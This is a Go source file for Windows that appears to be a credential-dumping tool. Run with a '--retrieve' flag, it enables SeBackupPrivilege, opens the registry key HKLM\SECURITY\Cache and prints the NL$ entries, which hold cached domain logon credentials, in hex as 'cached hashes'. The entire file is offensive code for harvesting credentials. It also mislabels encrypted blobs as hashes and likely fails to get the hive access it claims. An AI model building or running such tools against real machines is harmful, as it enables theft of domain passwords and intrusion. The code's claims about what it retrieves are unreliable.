//go:build windows
// +build windows

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"strings"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func main() {
	execute := flag.Bool("retrieve", false, "Retrieve cache")

	flag.Parse()

	if *execute {
		fmt.Println("Retrieving")
		cachedump()
	} else {
		fmt.Println("Use --retrieve flag to run the retrieval process")
		flag.PrintDefaults()
	}
}

func cachedump() {
	// Adjust the privileges to access the SECURITY hive
	adjustPrivileges()

	// Open the registry key
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Cache`, registry.READ)
	if err != nil {
		log.Fatalf("Failed to open registry key: %v", err)
	}
	defer key.Close()

	// Enumerate the values in the registry key
	values, err := key.ReadValueNames(0)
	if err != nil {
		log.Fatalf("Failed to read registry values: %v", err)
	}

	// Iterate over the values and extract domain hashes
	for _, value := range values {
		if strings.HasPrefix(value, "NL$") {
			hash, _, err := key.GetBinaryValue(value)
			if err != nil {
				log.Printf("Failed to read value %s: %v", value, err)
				continue
			}
			fmt.Printf("Cached hash for %s: %s\n", value, hex.EncodeToString(hash))
		}
	}
}

func adjustPrivileges() {
	var token windows.Token
	currentProcess, err := windows.GetCurrentProcess()
	if err != nil {
		log.Fatalf("Failed to get current process: %v", err)
	}

	err = windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		log.Fatalf("Failed to open process token: %v", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
	if err != nil {
		log.Fatalf("Failed to lookup privilege value: %v", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
	if err != nil {
		log.Fatalf("Failed to adjust token privileges: %v", err)
	}
}
